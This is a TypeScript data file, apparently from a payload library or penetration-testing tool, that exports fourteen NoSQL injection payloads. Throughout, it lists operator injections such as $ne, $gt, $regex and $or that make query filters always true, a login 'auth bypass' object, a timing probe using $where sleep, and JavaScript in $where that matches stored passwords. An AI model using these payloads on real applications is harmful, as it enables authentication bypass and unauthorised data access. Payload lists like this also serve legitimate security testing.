import type { PayloadItem } from '../types'

export const NOSQL_PAYLOADS: PayloadItem[] = [
  { id: 'nosql-1', category: 'nosql', featured: true, label: '$ne null', value: '{"$ne":null}' },
  { id: 'nosql-2', category: 'nosql', featured: true, label: '$gt empty', value: '{"$gt":""}' },
  { id: 'nosql-3', category: 'nosql', featured: true, label: '$where sleep', value: '{"$where":"sleep(5000)"}' },
  { id: 'nosql-4', category: 'nosql', featured: true, label: '$regex .', value: '{"$regex":".*"}' },
  { id: 'nosql-5', category: 'nosql', featured: true, label: '[$ne]', value: '[$ne]=1' },
  { id: 'nosql-6', category: 'nosql', featured: true, label: 'True JSON', value: 'true' },
  { id: 'nosql-7', category: 'nosql', featured: true, label: '$or always', value: '{"$or":[{},{"a":"a"}]}' },
  { id: 'nosql-8', category: 'nosql', featured: true, label: 'auth bypass', value: '{"username":{"$ne":null},"password":{"$ne":null}}' },
  { id: 'nosql-9', category: 'nosql', label: '$nin empty', value: '{"$nin":[]}' },
  { id: 'nosql-10', category: 'nosql', label: '$exists true', value: '{"$exists":true}' },
  { id: 'nosql-11', category: 'nosql', label: 'JS in $where', value: '{"$where":"this.password.match(/.*/)"}' },
  { id: 'nosql-12', category: 'nosql', label: 'Array inject', value: '["$ne",1]' },
  { id: 'nosql-13', category: 'nosql', featured: true, label: '$regex case', value: '{"$regex":"^admin$","$options":"i"}' },
  { id: 'nosql-14', category: 'nosql', featured: true, label: '$eq bypass', value: '{"$eq":null}' },
]
